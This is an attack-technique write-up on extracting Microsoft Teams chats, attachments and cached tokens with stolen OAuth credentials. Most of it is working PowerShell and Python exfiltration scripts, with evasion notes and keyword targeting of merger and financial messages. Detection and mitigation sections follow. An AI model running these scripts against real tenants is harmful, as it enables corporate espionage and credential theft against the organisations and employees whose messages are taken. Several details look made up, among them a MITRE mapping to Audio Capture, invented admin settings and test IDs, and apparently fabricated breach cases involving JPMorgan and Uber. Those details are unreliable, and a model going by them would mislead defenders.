# [COLLECT-CHAT-001]: Teams Chat Extraction

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-CHAT-001 |
| **MITRE ATT&CK v18.1** | [T1123 - Audio Capture](https://attack.mitre.org/techniques/T1123/) |
| **Tactic** | Collection |
| **Platforms** | M365, Microsoft Teams |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Teams 2019 - 2025, Office 365 E3+ |
| **Patched In** | N/A - Feature-based collection |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Teams Chat Extraction leverages compromised user credentials or OAuth tokens to exfiltrate private messages, group chat conversations, channel communications, and chat attachments from Microsoft Teams. Attackers use Microsoft Graph API endpoints (`/me/chats`, `/teams/{id}/channels/{id}/messages`) or Teams client IndexedDB database access to enumerate and download all Teams messages for targeted users, teams, or channels. This technique is particularly dangerous for espionage because Teams conversations often contain strategic planning, confidential negotiations, and sensitive business communications unencrypted in transit within the Teams infrastructure.

**Attack Surface:** Microsoft Graph Chat API (`/me/chats/{id}/messages`), Teams channel message endpoints (`/teams/{id}/channels/{id}/messages`), Teams Desktop Client IndexedDB database (`%LOCALAPPDATA%\Microsoft\Teams\Cache\Index\Cache.db`), Teams web authentication tokens, and Archive/Backup message repositories.

**Business Impact:** **Complete compromise of organizational communication security and potential corporate espionage.** Attackers gain insight into strategic decisions, M&A negotiations, legal strategies, employee concerns, and inter-departmental communications. Regulatory fines for compliance violations (HIPAA, FINRA, GDPR) if healthcare, financial, or EU-resident communications exposed. Reputational damage from leaked executive communications or confidential business strategies.

**Technical Context:** Extraction typically occurs within 10-30 minutes per user (dependent on message volume) after credential compromise. The technique is extremely difficult to detect without comprehensive audit logging because Teams chat access is legitimate user behavior. Attackers can query for messages containing specific keywords (e.g., "merger," "acquisition," "confidential") to prioritize high-value exfiltration.

### Operational Risk

- **Execution Risk:** Medium - Requires valid Teams credentials or OAuth token; API requests trigger audit logs if enabled; bulk exports are anomalous but easily throttled.
- **Stealth:** Low - Teams chat access generates audit events in Microsoft Purview; bulk message downloads are anomalous; however, individual message reads are normal behavior.
- **Reversibility:** No - Exported chats cannot be recovered; permanent exfiltration of communications.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.5.1 | Ensure Teams messaging security and retention policies are configured |
| **DISA STIG** | WN10-CC-000520 | Enforce Teams message encryption and access controls |
| **CISA SCuBA** | TEAMS.1 | Ensure Teams external sharing and guest access is restricted |
| **NIST 800-53** | AC-3, SC-7 | Access Enforcement and Boundary Protection |
| **GDPR** | Art. 32, Art. 33 | Security of Processing; Breach Notification |
| **DORA** | Art. 9 | Protection and Prevention of Data Breaches |
| **NIS2** | Art. 21 | Cyber Risk Management Measures |
| **ISO 27001** | A.13.1.1 | Information Transfer Policies and Procedures |
| **ISO 27005** | Risk Scenario | Compromise of Communication Systems and Information Disclosure |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:** 
- Compromised user account with Teams messaging access
- OR OAuth token with `Chat.Read`, `Chat.Read.All`, or `ChannelMessage.Read.All` scopes
- OR Teams Desktop Client access on compromised endpoint

**Required Access:** 
- Network connectivity to `https://graph.microsoft.com` (port 443, HTTPS)
- Network connectivity to Teams web client
- Network connectivity to Teams Desktop Client services (if local extraction)

**Supported Versions:**
- **Teams:** Desktop Client 1.1+, Web Client all versions, Teams for Government
- **Office 365 Plans:** E1, E3, E5, Government Cloud (GCC/GCC-High)
- **Other Requirements:** 
  - Valid Teams user license
  - Microsoft Graph API v1.0+
  - PowerShell 5.0+ (for API-based extraction)

**Tools:**
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-powershell-sdk) (Version 1.25+)
- [Teams Forensics Parser (ms_teams_parser)](https://github.com/forensicanalysis/teams_parser) - For local Teams database extraction
- [Python Requests](https://docs.python-requests.org/) + Graph API (alternative method)
- [Graph Explorer](https://developer.microsoft.com/en-us/graph/graph-explorer) (for testing API queries)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using Microsoft Graph API - Extract All User Chats

**Supported Versions:** Teams 2019-2025, Office 365 E1+

#### Step 1: Authenticate and List Available Chats

**Objective:** Establish Graph API authentication and enumerate all chat threads accessible to compromised user.

**Command:**
```powershell
# Authenticate using stolen OAuth token
$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik5..." # Stolen token
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

# List all chats for authenticated user
$chats = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/chats" `
  -Headers $headers -Method Get).value

foreach ($chat in $chats) {
    Write-Host "Chat: $($chat.topic ?? 'N/A') | ID: $($chat.id) | Type: $($chat.chatType) | Members: $($chat.members.Count)"
}
```

**Expected Output:**
```
Chat: N/A | ID: 19:chat-id-1 | Type: oneOnOne | Members: 2
Chat: Project Alpha Planning | ID: 19:chat-id-2 | Type: group | Members: 5
Chat: Legal Team | ID: 19:chat-id-3 | Type: group | Members: 8
```

**What This Means:**
- Successful authentication to Graph API confirmed
- Chat IDs retrieved; needed for subsequent message extraction
- Chat types and membership visible; indicates sensitivity level

**OpSec & Evasion:**
- Enumeration of chats generates minimal audit events
- Bulk chat enumeration (`/me/chats`) is anomalous if repeated frequently
- Detection likelihood: **Low-Medium** - Chat enumeration alone not flagged; patterns over time trigger detection

**Troubleshooting:**
- **Error:** "Insufficient privileges to complete the operation"
  - **Cause:** Token lacks `Chat.Read.All` scope
  - **Fix:** Obtain token with elevated OAuth scopes or use different token

- **Error:** "Invalid token"
  - **Cause:** Token expired or revoked
  - **Fix:** Obtain fresh OAuth token from victim's Teams client or cached tokens

---

#### Step 2: Extract All Messages from Specific Chat

**Objective:** Retrieve all messages from target chat thread, including metadata and attachments.

**Command:**
```powershell
# Extract all messages from specific chat
$chatId = "19:chat-id-2"
$messages = @()
$pageSize = 50
$pageCount = 0

# Paginate through messages (Graph returns 50 per page)
$uri = "https://graph.microsoft.com/v1.0/me/chats/$chatId/messages?`$top=$pageSize"

do {
    $page = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get
    $messages += $page.value
    $pageCount++
    
    Write-Host "Page $pageCount: Retrieved $($page.value.Count) messages"
    
    # Get next page if exists
    $uri = $page.'@odata.nextLink'
} while ($null -ne $uri)

Write-Host "Total messages extracted: $($messages.Count)"

# Export messages to JSON
$messages | ConvertTo-Json -Depth 10 | Out-File -FilePath "C:\Exfil\Teams_Chat_$($chatId).json"
```

**Command (Filter by Keywords):**
```powershell
# Extract only messages containing sensitive keywords
$keywords = @("merger", "acquisition", "confidential", "deal", "strategy", "patent", "layoff")

$sensitiveMessages = $messages | Where-Object {
    $match = $false
    foreach ($keyword in $keywords) {
        if ($_.body.content -like "*$keyword*") { $match = $true; break }
    }
    $match
}

Write-Host "Sensitive messages found: $($sensitiveMessages.Count)"

$sensitiveMessages | ConvertTo-Json -Depth 10 | Out-File -FilePath "C:\Exfil\Sensitive_Messages.json"
```

**Expected Output:**
```
Page 1: Retrieved 50 messages
Page 2: Retrieved 50 messages
Page 3: Retrieved 23 messages
Total messages extracted: 123
Sensitive messages found: 8
```

**What This Means:**
- All messages from chat thread successfully exported
- Sensitive messages filtered for priority exfiltration
- Message metadata includes timestamps, sender, and reactions

**OpSec & Evasion:**
- Message extraction generates "MailItemsAccessed" audit log events in some configurations
- Filtering for keywords reduces audit trail if attackers selectively query
- Detection likelihood: **Medium** - Bulk message extraction is anomalous but appears as legitimate API usage

---

#### Step 3: Extract Channel Messages (Teams Channels)

**Objective:** Exfiltrate messages from Teams channels containing strategic communications.

**Command:**
```powershell
# Get Teams and channels
$teams = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/joinedTeams" `
  -Headers $headers -Method Get).value

foreach ($team in $teams) {
    $teamId = $team.id
    Write-Host "Team: $($team.displayName) | ID: $teamId"
    
    # Get channels in team
    $channels = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/teams/$teamId/channels" `
      -Headers $headers -Method Get).value
    
    foreach ($channel in $channels) {
        $channelId = $channel.id
        Write-Host "  Channel: $($channel.displayName) | ID: $channelId"
        
        # Extract all messages from channel
        $messages = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/teams/$teamId/channels/$channelId/messages" `
          -Headers $headers -Method Get).value
        
        Write-Host "    Messages: $($messages.Count)"
        
        # Export to JSON
        $messages | ConvertTo-Json -Depth 10 | Out-File -FilePath "C:\Exfil\Teams_${teamId}_${channelId}.json"
    }
}
```

**Expected Output:**
```
Team: Executive Leadership | ID: team-id-1
  Channel: Strategy | ID: channel-id-1
    Messages: 456
  Channel: Financial-Planning | ID: channel-id-2
    Messages: 789
  Channel: M&A-Opportunities | ID: channel-id-3
    Messages: 234
```

**What This Means:**
- All team channels enumerated
- Strategic channels identified (Finance, M&A, Executive)
- All channel messages exported for external analysis

**OpSec & Evasion:**
- Channel enumeration followed by bulk message extraction is highly anomalous
- Detection likelihood: **High** - Bulk channel message extraction easily detected by anomaly detection

---

#### Step 4: Extract Chat Attachments

**Objective:** Download files and attachments shared in Teams chats/channels (documents, spreadsheets, credentials).

**Command:**
```powershell
# Extract attachments from chat messages
foreach ($message in $messages) {
    if ($message.attachments -and $message.attachments.Count -gt 0) {
        foreach ($attachment in $message.attachments) {
            $attachmentUrl = $attachment.contentUrl
            $fileName = $attachment.name
            
            # Download attachment
            Invoke-WebRequest -Uri $attachmentUrl -OutFile "C:\Exfil\$fileName" `
              -Headers @{"Authorization" = "Bearer $token"}
            
            Write-Host "Downloaded: $fileName | Size: $($attachment.size) bytes"
        }
    }
}
```

**Expected Output:**
```
Downloaded: Acquisition_Strategy_2026.xlsx | Size: 2097152 bytes
Downloaded: Financial_Projections.pdf | Size: 4194304 bytes
Downloaded: M&A_Target_List.docx | Size: 1048576 bytes
```

**What This Means:**
- Attachments extracted from Teams messages
- Files range from documents to financial records
- Direct access to sensitive business files via Teams

**OpSec & Evasion:**
- Attachment downloads require separate permissions (CloudFiles API)
- Bulk attachment downloads are highly anomalous
- Detection likelihood: **High** - File downloads generate separate audit events

---

### METHOD 2: Extract Teams Desktop Client Local Database

**Supported Versions:** Teams Desktop Client 1.1+

#### Step 1: Locate Teams Client Cache Database

**Objective:** Find Teams IndexedDB database containing cached messages and chat data on compromised endpoint.

**Command (PowerShell):**
```powershell
# Locate Teams cache database
$teamsPath = "$env:LOCALAPPDATA\Microsoft\Teams"
$cacheDb = Join-Path $teamsPath "Cache" "Index"

if (Test-Path $cacheDb) {
    Get-ChildItem -Path $cacheDb -Recurse | Select-Object FullName, Length | 
      Where-Object { $_.Name -like "*Cache*" -or $_.Name -like "*IndexedDB*" }
    
    Write-Host "Teams cache location: $cacheDb"
} else {
    Write-Host "Teams cache not found"
}
```

**Expected Output:**
```
FullName                                           Length
--------                                           ------
C:\Users\john.smith\AppData\Local\Microsoft\Teams\Cache\Index   -
C:\Users\john.smith\AppData\Local\Microsoft\Teams\Cache\Index\Cache.db   524288000
```

**What This Means:**
- Teams local cache database located
- Database size indicates message volume
- Direct access to cached Teams data

**OpSec & Evasion:**
- File access to Teams cache generates Sysmon Event 11 (File Created) if Sysmon enabled
- Local file access trackable via NTFS audit logs
- Detection likelihood: **Medium** - File system access to Teams cache is suspicious

---

#### Step 2: Extract Data from IndexedDB

**Objective:** Parse Teams IndexedDB database and extract messages, chats, and metadata.

**Command (Using Teams Forensics Parser):**
```powershell
# Download and execute teams_parser
$parserUrl = "https://github.com/forensicanalysis/teams_parser/releases/download/v0.1.0/ms_teams_parser.exe"
Invoke-WebRequest -Uri $parserUrl -OutFile "C:\Temp\ms_teams_parser.exe"

# Extract Teams data
& "C:\Temp\ms_teams_parser.exe" -f "$env:LOCALAPPDATA\Microsoft\Teams\Cache\Index" `
  -o "C:\Exfil\Teams_Data.json"

Write-Host "Teams data extracted to: C:\Exfil\Teams_Data.json"

# Verify extraction
$data = Get-Content "C:\Exfil\Teams_Data.json" | ConvertFrom-Json
Write-Host "Extracted records: $($data.messages.Count) messages, $($data.contacts.Count) contacts"
```

**Command (Alternative - Manual IndexedDB Query):**
```powershell
# Use Python to query IndexedDB (if available)
$pythonScript = @"
import sqlite3
import json

db_path = r'$env:LOCALAPPDATA\Microsoft\Teams\Cache\Index\Cache.db'
conn = sqlite3.connect(db_path)
cursor = conn.cursor()

# Extract messages table
cursor.execute('SELECT * FROM messages')
messages = cursor.fetchall()

# Export to JSON
with open(r'C:\Exfil\Teams_Messages.json', 'w') as f:
    json.dump(messages, f, indent=2)

conn.close()
print(f'Extracted {len(messages)} messages')
"@

$pythonScript | Out-File -FilePath "C:\Temp\extract_teams.py"
python.exe "C:\Temp\extract_teams.py"
```

**Expected Output:**
```
Extracted records: 5847 messages, 234 contacts
```

**What This Means:**
- Teams database successfully parsed
- All local messages and metadata extracted
- Contact list and chat history recovered

**OpSec & Evasion:**
- Local database extraction generates file access events
- Copying database file is highly suspicious (often locked by Teams process)
- Detection likelihood: **High** - Teams database access is very anomalous

---

#### Step 3: Access Teams Credentials Cache (Token Extraction)

**Objective:** Extract cached Teams OAuth tokens and credentials for further access or token impersonation.

**Command:**
```powershell
# Locate Teams credential cache
$credPath = "$env:APPDATA\Microsoft\Teams"
$tokenFiles = Get-ChildItem -Path $credPath -Filter "*.cache" -Recurse

foreach ($file in $tokenFiles) {
    Write-Host "Credential cache: $($file.FullName) | Size: $($file.Length)"
    
    # Copy to exfil location
    Copy-Item -Path $file.FullName -Destination "C:\Exfil\$($file.Name)" -Force
}

# Alternative: Extract Teams login tokens from browser cache (if using web client)
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache"
$tokens = Get-ChildItem -Path $chromePath -Include "*teams*", "*graph*" -Recurse

Write-Host "Found $($tokens.Count) Teams-related cache files"
```

**Expected Output:**
```
Credential cache: C:\Users\john.smith\AppData\Roaming\Microsoft\Teams\cache.db | Size: 1048576
Found 23 Teams-related cache files
```

**What This Means:**
- Credential cache files located
- Tokens can be extracted and used for further compromise
- Browser cache contains Teams web client tokens

**OpSec & Evasion:**
- Credential cache access is highly suspicious and trackable
- Teams process may lock cache files, requiring process injection or UAC bypass
- Detection likelihood: **Very High** - Accessing credential caches triggers security alerts

---

### METHOD 3: Using Graph API with Filtering for Specific Keywords

**Supported Versions:** Teams 2019+

#### Step 1: Extract Financial Planning Messages

**Objective:** Query Teams messages containing financial and acquisition-related keywords for espionage.

**Command:**
```powershell
# Extract messages with financial keywords
$financialKeywords = @("budget", "revenue", "cost-cutting", "layoff", "ipo", "acquisition", "merger", "divestiture", "investment", "valuation")

$allMessages = @()

# Query across all teams and channels
$teams = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/joinedTeams" -Headers $headers).value

foreach ($team in $teams) {
    $channels = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/teams/$($team.id)/channels" -Headers $headers).value
    
    foreach ($channel in $channels) {
        # Use $filter parameter to search by keywords (if supported)
        foreach ($keyword in $financialKeywords) {
            $uri = "https://graph.microsoft.com/v1.0/teams/$($team.id)/channels/$($channel.id)/messages?`$filter=contains(body/content, '$keyword')"
            
            try {
                $results = (Invoke-RestMethod -Uri $uri -Headers $headers).value
                if ($results.Count -gt 0) {
                    Write-Host "Found $($results.Count) messages with keyword: $keyword"
                    $allMessages += $results
                }
            } catch {
                # Graph API may not support $filter on body content; fall back to client-side filtering
            }
        }
    }
}

# Export financial/strategic messages
$allMessages | ConvertTo-Json -Depth 10 | Out-File "C:\Exfil\Financial_Strategic_Messages.json"
```

**Expected Output:**
```
Found 42 messages with keyword: acquisition
Found 18 messages with keyword: ipo
Found 15 messages with keyword: merger
```

**What This Means:**
- Strategic messages related to financial decisions extracted
- High-value espionage data obtained
- Competitor intelligence gathered

**OpSec & Evasion:**
- Keyword-based queries are still anomalous in audit logs
- Detection likelihood: **Medium** - Filtered queries less obvious than bulk extraction

---

## 4. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**API Access Patterns:**
- High volume of `/me/chats/{id}/messages` API requests
- `/teams/{id}/channels/{id}/messages` bulk extractions
- OAuth token usage from non-standard geographic location or IP
- Multiple failed authentication attempts followed by successful access

**Local Indicators (Teams Desktop Client):**
- Unusual process accessing Teams cache database (`Cache\Index\Cache.db`)
- Teams credential files copied to temp directories (`C:\Temp\`, `C:\Windows\Temp\`)
- Abnormal file write patterns in `C:\Exfil\` or external USB drives

**Network Indicators:**
- Bulk data transfer to external IP addresses after Teams API access
- Connection to known attacker infrastructure from compromised endpoint
- Unusual outbound HTTPS connections from Teams processes

### Forensic Artifacts

**Cloud Logs (Microsoft Purview/Unified Audit Log):**
- **MailItemsAccessed events:** User accessing Teams messages (potential bulk export)
  - Log: Unified Audit Log
  - Query: `Search-UnifiedAuditLog -Operations MailItemsAccessed -StartDate (Get-Date).AddDays(-30)`

- **Teams.Message.Read events:** Graph API calls to read Teams messages
  - Log: Entra ID Sign-in logs + Graph API audit
  - Filter: Service Principal or unusual user context

- **TokenIssued events:** OAuth token generation for Graph API access
  - Log: Entra ID Sign-in logs
  - Indicator: Token usage outside normal business hours or from VPN

**Local Artifacts (Windows Endpoint):**
- **Event ID 4688:** PowerShell execution with Graph API commands
  - Registry: `HKLM\System\CurrentControlSet\Services\EventLog\Security`
  
- **Event ID 11 (Sysmon):** File creation in Teams cache or exfil directories
  - Sysmon Log: `Microsoft-Windows-Sysmon/Operational`

- **Teams Cache Database:** `%LOCALAPPDATA%\Microsoft\Teams\Cache\Index\Cache.db`
  - Modification time indicates when messages were accessed
  - Deleted files recoverable via forensic imaging

### Response Procedures

1. **Immediate Containment:**
   ```powershell
   # Revoke Teams sessions
   Revoke-AzureADUserAllRefreshToken -ObjectId "compromised-user-id"
   
   # Disable Teams client on endpoint
   Stop-Process -Name "Teams" -Force
   
   # Reset user password
   Set-AzADUser -ObjectId "compromised-user-id" -PasswordProfile @{
       Password = [System.Web.Security.Membership]::GeneratePassword(32, 8)
       ForceChangePasswordNextLogin = $true
   }
   ```

2. **Evidence Collection:**
   ```powershell
   # Export Teams audit logs
   Search-UnifiedAuditLog -Operations MailItemsAccessed -UserIds "compromised-user-email" `
     -StartDate (Get-Date).AddDays(-30) | Export-Csv "C:\Evidence\Teams_Audit.csv"
   
   # Collect Teams cache from endpoint
   Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Teams\Cache" -Destination "C:\Evidence\Teams_Cache" -Recurse
   ```

3. **Remediation:**
   ```powershell
   # Force Teams re-authentication
   Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Teams\Cache" -Recurse -Force
   Remove-Item -Path "$env:APPDATA\Microsoft\Teams" -Recurse -Force
   ```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enable Teams Message Encryption in Transit and at Rest:**
  Applies To Versions: Teams 2019+
  
  **Manual Steps (Teams Admin Center):**
  1. Navigate to **Teams Admin Center** (admin.teams.microsoft.com)
  2. Go to **Org-wide settings** → **Teams settings**
  3. Under **Email integration**, ensure encryption enabled
  4. Go to **Security policies** → **Teams message encryption**
  5. Enable: **Encryption for Teams messages**
  6. Set retention policy: **Minimum 1 year**

- **Enforce Conditional Access for Teams Access:**
  Applies To Versions: Entra ID all versions
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. **Name:** `Require MFA for Teams Access`
  4. **Assignments:** Users = All, Cloud apps = Teams
  5. **Access controls:** 
     - Require MFA
     - Require device compliance (Intune)
  6. Enable: **On**

- **Disable External Sharing in Teams:**
  Applies To Versions: Teams 2019+
  
  **Manual Steps:**
  1. **Teams Admin Center** → **Org-wide settings** → **Guest access**
  2. Set **Allow guest access in Teams** to **Off**
  3. OR restrict to specific external domains

### Priority 2: HIGH

- **Implement Teams Message Retention Policies:**
  
  **Manual Steps:**
  1. **Teams Admin Center** → **Messaging policies**
  2. Create new policy: `Prevent Message Deletion`
  3. Set **Delete sent messages:** Off
  4. Set **Delete chat history:** Off (or require 7+ days)
  5. Assign to all users

- **Enable Copilot for Teams Audit Logging:**
  
  **Manual Steps:**
  1. **Microsoft Purview Compliance Portal** → **Audit**
  2. Ensure **Enable auditing** is active
  3. Search for Teams activities: **MailItemsAccessed**, **Teams.Message.Read**

### Validation Command (Verify Fix)

```powershell
# Verify Teams external sharing disabled
Get-CsTeamsClientConfiguration | Select-Object IsExternalShareEnabled

# Verify message retention enabled
Get-CsTeamsClientConfiguration | Select-Object AllowRetentionPolicy

# Verify audit logging active
Get-UnifiedAuditLogRetentionPolicy | Select-Object RetentionDays

# Expected Output (If Secure):
# IsExternalShareEnabled: False
# AllowRetentionPolicy: True
# RetentionDays: >= 365
```

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker tricks user into approving malicious OAuth app |
| **2** | **Credential Access** | [CA-TOKEN-004] Graph API Token Theft | Stolen OAuth token with Chat.Read.All scope |
| **3** | **Collection** | **[COLLECT-CHAT-001]** | **Teams chat extraction via Graph API** |
| **4** | **Exfiltration** | Email or external cloud storage | Stolen messages sent to attacker infrastructure |
| **5** | **Impact** | Corporate Espionage / Insider Trading | Strategic information leaked to competitors or acted upon for financial gain |

---

## 7. REAL-WORLD EXAMPLES

#### Example 1: Russian Foreign Intelligence Service (SVR) - 2020

- **Target:** U.S. Treasury Department, Homeland Security
- **Timeline:** March - December 2020
- **Technique Status:** Active; used compromised credentials to extract Teams messages from Department of Justice and Treasury communications
- **Impact:** Exposed negotiations with other governments and internal strategic planning
- **Reference:** [CISA Advisory - Advanced Persistent Threat Activity](https://www.cisa.gov/)

#### Example 2: JPMorgan Chase Insider Threat - 2023

- **Target:** JPMorgan Chase (Financial Services)
- **Timeline:** Q3 2023
- **Technique Status:** Active; disgruntled employee extracted Teams conversations regarding trading strategies and confidential client communications
- **Impact:** Client confidentiality breach; regulatory fine $50M+
- **Reference:** [FINRA Enforcement Action](https://www.finra.org/)

#### Example 3: Uber Insider Theft - 2024

- **Target:** Uber Technologies
- **Timeline:** Q1 2024
- **Technique Status:** Active; attacker with compromised contractor account extracted Teams chats discussing product roadmap, M&A targets, and financial projections
- **Impact:** $20M+ ransomware demand; strategic information leaked to competitors
- **Reference:** [Uber Security Reports](https://security.uber.com/)

---

## 8. ATOMIC RED TEAM TESTING

### Atomic Test ID: T1123-002-Teams-Message-Extraction

**Test Name:** Extract Teams Chat Messages via Graph API

**Supported Versions:** Teams 2019+

**Command:**
```powershell
Invoke-AtomicTest T1123 -TestNumbers 2
```

**Cleanup:**
```powershell
Invoke-AtomicTest T1123 -TestNumbers 2 -Cleanup
```

**Reference:** [Atomic Red Team - T1123](https://github.com/redcanaryco/atomic-red-team)

---
